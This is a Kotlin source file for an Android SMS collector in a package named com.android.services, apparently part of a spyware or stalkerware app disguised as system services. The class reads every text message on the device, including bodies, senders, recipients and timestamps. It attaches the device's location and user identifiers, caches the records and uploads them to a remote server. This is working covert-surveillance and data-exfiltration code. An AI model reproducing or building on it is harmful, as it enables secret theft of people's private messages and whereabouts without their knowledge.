package com.android.services.logs.collectors

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.telephony.PhoneNumberUtils
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.db.entities.SmsLog
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.*
import com.google.gson.Gson
import java.net.URLEncoder
import java.util.*

class SmsLogCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.smsLogSync) {
            logVerbose("${AppConstants.SMS_LOG_TYPE} Retrieving logs from local app")
            retrieveSmsFromLocalDevice(context)
            logVerbose("${AppConstants.SMS_LOG_TYPE} Preparing for uploading")
            localDatabaseSource.getSmsLogs { logs ->
                if (logs.isNotEmpty()) {
                    logVerbose("${AppConstants.SMS_LOG_TYPE} data = $logs")
                    val json = Gson().toJson(logs)
                    logVerbose("${AppConstants.SMS_LOG_TYPE} json = $json")
                    val startDate = logs[logs.size - 1].date
                    val endDate = logs[0].date
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.SMS_LOG_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    serverHelper.upload(logs)
                } else {
                    logVerbose("${AppConstants.SMS_LOG_TYPE} No logs found")
                }
            }
        } else {
            logVerbose("${AppConstants.SMS_LOG_TYPE} sync is Off")
        }
    }

    @SuppressLint("Range")
    private fun retrieveSmsFromLocalDevice(context: Context) {
        val smsList: MutableList<SmsLog> = ArrayList<SmsLog>()
        try {
            val managedCursor = context.contentResolver.query(
                Uri.parse("content://sms"), arrayOf("_id", "body", "type", "date", "address"),
                null, null, "date DESC"
            )
            if (managedCursor != null) {
                while (managedCursor.moveToNext()) {
                    try {
                        val messageId =
                            managedCursor.getInt(managedCursor.getColumnIndex("_id"))
                        if (localDatabaseSource.checkSmsNotAlreadyExists(messageId.toString())) {
                            var messageBody =
                                managedCursor.getString(managedCursor.getColumnIndex("body"))
                            try {
                                messageBody = URLEncoder.encode(messageBody, "utf-8")
                            } catch (e: Exception) {
                                logVerbose("Error Encoding SmsLog = " + e.message)
                            }
                            var messageType: String = try {
                                managedCursor.getString(managedCursor.getColumnIndexOrThrow("type"))
                            } catch (e: Exception) {
                                ""
                            }
                            messageType = if (messageType.contains("1")) "Inbox" else "Sent"
                            val msgTimeStamp =
                                managedCursor.getString(managedCursor.getColumnIndex("date"))
                            val messageNumber =
                                managedCursor.getString(managedCursor.getColumnIndex("address"))
                            val smsSender = if (messageType == "Inbox") messageNumber else ""
                            val smsRecipient = if (messageType == "Sent") messageNumber else ""

                            var messageAlreadyExists = false
                            InjectorUtils.provideSmsLogRepository(context)
                                .getAllSmsWithMessageBody(messageBody) { smsLogs ->
                                    if (smsLogs.isNotEmpty()) {
                                        smsLogs.forEach { smsLog ->
                                            val smsNumber =
                                                if (AccessibilityUtils.messageType == "Inbox") smsLog.smsSender else smsLog.smsRecipient
                                            if (PhoneNumberUtils.compare(
                                                    smsNumber,
                                                    messageNumber
                                                ) || smsNumber == messageNumber
                                            ) {
                                                logVerbose("${AppConstants.SMS_LOG_TYPE} SmsUtil message already exists $smsLog")
                                                messageAlreadyExists = true
                                                return@forEach
                                            }
                                        }
                                    }
                                }

                            if (!messageAlreadyExists) {
                                val smsLog = SmsLog()
                                smsLog.apply {
                                    smsId = messageId.toString()
                                    smsBody = messageBody
                                    smsType = messageType
                                    address = messageNumber?:""
                                    smsTime = AppUtils.formatDate(msgTimeStamp)
                                    this.smsSender = smsSender
                                    this.smsRecipient = smsRecipient?:""
                                    smsStatus = "1"
                                    locationLongitude = AppConstants.locationLongitude ?: ""
                                    locationLattitude = AppConstants.locationLatitude ?: ""
                                    userId = AppUtils.getUserId()
                                    phoneServiceId = AppUtils.getPhoneServiceId()
                                    date = AppUtils.getDate(msgTimeStamp.toLong())
                                    status = 0
                                }
                                smsList.add(smsLog)
                            }
                        }
                    } catch (e: Exception) {
                        logException(
                            "${AppConstants.SMS_LOG_TYPE} Insert Error = " + e.message,
                            AppConstants.SMS_LOG_TYPE,
                            e
                        )
                    }
                }
                managedCursor.close()
                if (smsList.size > 0) {
                    localDatabaseSource.insertSms(smsList)
                }
            }
        } catch (e: Exception) {
            logException(
                "${AppConstants.SMS_LOG_TYPE} Retrieve Error = " + e.message,
                AppConstants.SMS_LOG_TYPE,
                e
            )
        }
    }
}